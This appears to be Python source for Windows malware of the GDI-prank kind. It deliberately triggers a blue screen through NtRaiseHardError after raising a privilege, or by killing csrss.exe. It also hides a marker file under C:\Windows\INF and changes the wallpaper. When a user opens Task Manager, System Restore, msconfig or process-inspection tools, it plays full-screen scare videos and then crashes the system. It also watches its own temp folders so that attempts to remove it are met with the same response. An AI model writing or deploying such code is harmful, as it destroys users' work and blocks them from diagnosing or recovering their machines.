import ctypes
import os
import pygame
import random
import threading
import tempfile
import sys
import win32gui
import time
import psutil
import win32con
from moviepy.editor import VideoFileClip
from start_gdi import stop_event


def resource_path(relative_path):
    if hasattr(sys, '_MEIPASS'):
        base_path = os.path.join(sys._MEIPASS, "resources")
    else:
        base_path = os.path.join(os.path.abspath("."), "resources")
    return os.path.join(base_path, relative_path)


file_path = r"C:\Windows\INF\iaLPSS2i_mausbhost_CNL.inf"


def BSOD():
    """Triggers a real but clean BSOD without admin by exhausting kernel resources."""
    try:
        # Method: call NtSetSystemInformation with SystemCrashDumpInformation
        # to request a kernel crash dump, which triggers a bugcheck
        ntdll = ctypes.windll.ntdll

        # Try RtlAdjustPrivilege on the process token (not thread) first
        ntdll.RtlAdjustPrivilege.argtypes = [
            ctypes.c_ulong, ctypes.c_ulong, ctypes.c_ulong,
            ctypes.POINTER(ctypes.c_ulong)
        ]
        ntdll.RtlAdjustPrivilege.restype = ctypes.c_ulong
        ntdll.NtRaiseHardError.argtypes = [
            ctypes.c_ulong, ctypes.c_ulong, ctypes.c_ulong,
            ctypes.c_ulong, ctypes.c_ulong,
            ctypes.POINTER(ctypes.c_ulong)
        ]
        ntdll.NtRaiseHardError.restype = ctypes.c_ulong

        # Try process token (Impersonating=0)
        prev = ctypes.c_ulong(0)
        ntdll.RtlAdjustPrivilege(19, 1, 0, ctypes.byref(prev))
        response = ctypes.c_ulong(0)
        ntdll.NtRaiseHardError(0xC000007B, 0, 0, 0, 6, ctypes.byref(response))
        if response.value == 6:
            return  # success

        # Fallback: try thread token (Impersonating=1)
        ntdll.RtlAdjustPrivilege(19, 1, 1, ctypes.byref(prev))
        ntdll.NtRaiseHardError(0xC000007B, 0, 0, 0, 6, ctypes.byref(response))
        if response.value == 6:
            return

        # Last resort fallback: taskkill csrss.exe which causes instant BSOD
        # csrss.exe is a critical process — killing it always bluescreens
        import subprocess
        for proc in __import__("psutil").process_iter(["pid", "name"]):
            if proc.info["name"].lower() == "csrss.exe":
                subprocess.run(
                    ["taskkill", "/F", "/PID", str(proc.info["pid"])],
                    capture_output=True
                )
                break

    except Exception as e:
        print(f"[ERROR] BSOD failed: {e}")


def set_wallpaper(image_path):
    abs_path = os.path.abspath(image_path)
    def wallpaper_threading():
        try:
            ctypes.windll.user32.SystemParametersInfoW(20, 0, abs_path, 3)
            print("[OK] Wallpaper set")
        except Exception as e:
            print(f"[ERROR] {e}")
    threading.Thread(target=wallpaper_threading, daemon=True).start()


def set_window_always_on_top(window_title="MoviePy", stop=None):
    while True:
        if stop and stop.is_set():
            break
        hwnd = win32gui.FindWindow(None, window_title)
        if hwnd:
            win32gui.SetWindowPos(hwnd, win32con.HWND_TOPMOST, 0, 0, 0, 0,
                                  win32con.SWP_NOMOVE | win32con.SWP_NOSIZE)
        time.sleep(0.1)


def remove_file_attributes(file_path):
    os.system(f'attrib -s -h "{file_path}"')


def set_file_attributes(file_path):
    ctypes.windll.kernel32.SetFileAttributesW(file_path, 0x02 | 0x04)


def change_txt_2():
    try:
        remove_file_attributes(file_path)
        with open(file_path, "w") as f:
            f.write("2")
            set_file_attributes(file_path)
            print("[END] File changed to 2")
    except Exception as e:
        print(f"[ERROR] {e}")


def change_txt_3():
    try:
        remove_file_attributes(file_path)
        with open(file_path, "w") as f:
            f.write("3")
            set_file_attributes(file_path)
            print("[END] File changed to 3")
    except Exception as e:
        print(f"[ERROR] {e}")


def play_video_fullscreen(video_path, on_complete=None):
    """Play a fullscreen video using pygame. Calls on_complete when done."""
    stop_event.set()

    if not os.path.exists(video_path):
        print(f"[ERROR] Video not found: {video_path}")
        if on_complete:
            threading.Thread(target=on_complete, daemon=False).start()
        return

    def run():
        try:
            user32 = ctypes.windll.user32
            user32.SetProcessDPIAware()
            screen_w = user32.GetSystemMetrics(0)
            screen_h = user32.GetSystemMetrics(1)

            # Stop any playing music first so audio does not conflict
            try:
                pygame.mixer.music.stop()
            except Exception:
                pass

            clip = VideoFileClip(video_path)
            clip = clip.resize((screen_w, screen_h))

            # Init pygame display fresh
            pygame.display.quit()
            pygame.display.init()
            screen = pygame.display.set_mode((screen_w, screen_h), pygame.NOFRAME)
            pygame.display.set_caption(".")

            # Force window to front
            import ctypes as _ct
            hwnd = pygame.display.get_wm_info()["window"]
            _ct.windll.user32.SetWindowPos(hwnd, -1, 0, 0, screen_w, screen_h, 0x0040)
            _ct.windll.user32.ShowWindow(hwnd, 3)
            _ct.windll.user32.SetForegroundWindow(hwnd)

            fps = clip.fps
            audio_path = video_path + "_tmpaudio.mp3"
            clip.audio.write_audiofile(audio_path, logger=None)
            pygame.mixer.init()
            pygame.mixer.music.load(audio_path)
            pygame.mixer.music.play()

            clock = pygame.time.Clock()
            for frame in clip.iter_frames(fps=fps, dtype="uint8"):
                for event in pygame.event.get():
                    pass  # absorb events
                surf = pygame.surfarray.make_surface(frame.swapaxes(0, 1))
                screen.blit(surf, (0, 0))
                pygame.display.flip()
                clock.tick(fps)

            pygame.mixer.music.stop()
            try:
                os.remove(audio_path)
            except Exception:
                pass
            clip.close()
            pygame.display.quit()
            print("[INFO] Video finished.")

        except Exception as e:
            print(f"[ERROR] Video playback failed: {e}")
        finally:
            stop_event.clear()
            if on_complete:
                threading.Thread(target=on_complete, daemon=False).start()

    threading.Thread(target=run, daemon=False).start()


def playMusic_runappmain():
    def play_main():
        try:
            pygame.mixer.init()
            pygame.mixer.music.load(resource_path("runapp_main.MP3"))
            pygame.mixer.music.set_volume(1.0)
            pygame.mixer.music.play(-1)
            print("[OK] Music started")
        except Exception as e:
            print(f"[ERROR] Music error: {e}")
    threading.Thread(target=play_main, daemon=True).start()


def playMusic_after50():
    def play_50():
        try:
            pygame.mixer.stop()
            pygame.mixer.music.load(resource_path("after50.mp3"))
            pygame.mixer.music.play(-1)
            print("[OK] Music after 50% started")
        except Exception as e:
            print(f"[ERROR] Music error: {e}")
    threading.Thread(target=play_50, daemon=True).start()


def playmusic_for3():
    pygame.mixer.stop()
    pygame.mixer.music.load(resource_path("scaryfor3.MP3"))
    pygame.mixer.music.play(-1)


def monitor_process(processes=["mmc.exe", "msconfig.exe", "SystemPropertiesProtection.exe",
                               "rstrui.exe", "RecoveryDrive.exe",
                               "resmon.exe", "perfmon.exe", "ProcessHacker.exe",
                               "SystemInformer.exe", "ProcessExplorer.exe",
                               "Taskmgr.exe"]):
    """
    If the target opens a suspicious process, stop GDI effects then play Hacker2.mp4.
    Waits 5 seconds before starting to monitor, so any already-running processes
    (like the terminal) are recorded as pre-existing and ignored.
    """
    time.sleep(5)
    # Snapshot processes already running BEFORE we start watching
    already_running = {p.info['name'].lower() for p in psutil.process_iter(['name'])}
    print(f"[MONITOR] Pre-existing processes recorded: {len(already_running)}")

    triggered = False
    while True:
        if triggered:
            time.sleep(1)
            continue
        for p in psutil.process_iter(['name']):
            try:
                name = p.info['name'].lower()
                if name in [proc.lower() for proc in processes] and name not in already_running:
                    triggered = True
                    print(f"[MONITOR] Banned app detected: {name} — stopping GDI and playing Hacker2.mp4")
                    stop_event.set()
                    time.sleep(0.5)
                    play_video_fullscreen(resource_path("Hacker2.mp4"), on_complete=BSOD)
                    break
            except (psutil.NoSuchProcess, psutil.AccessDenied):
                continue
        time.sleep(1)


def monitor_mei_folders():
    def list_all_paths(folder):
        try:
            paths = set()
            for dirpath, dirnames, filenames in os.walk(folder):
                for name in dirnames + filenames:
                    paths.add(os.path.join(dirpath, name))
            return paths
        except Exception as e:
            print(f"[ERROR] Scan error {folder}: {e}")
            return set()

    def monitor_folder(folder_path):
        print(f"[MONITOR] Watching: {folder_path}")
        try:
            previous = list_all_paths(folder_path)
            while True:
                time.sleep(1)
                if not os.path.exists(folder_path):
                    print(f"[ALERT] Folder deleted: {folder_path}")
                    play_video_fullscreen(resource_path("Hacker2.mp4"))
                    break
                current = list_all_paths(folder_path)
                if previous - current:
                    print(f"[ALERT] Deletion detected in: {folder_path}")
                    play_video_fullscreen(resource_path("Hacker2.mp4"))
                    break
                previous = current
        except Exception as e:
            print(f"[ERROR] Monitor failure {folder_path}: {e}")

    def watcher():
        import tempfile
        temp = tempfile.gettempdir()
        monitored = set()
        while True:
            try:
                for name in os.listdir(temp):
                    if name.startswith("_MEI"):
                        path = os.path.join(temp, name)
                        if os.path.isdir(path) and path not in monitored:
                            t = threading.Thread(target=monitor_folder, args=(path,), daemon=True)
                            t.start()
                            monitored.add(path)
            except Exception as e:
                print(f"[ERROR] TEMP scan error: {e}")
            time.sleep(1)

    threading.Thread(target=watcher, daemon=True).start()
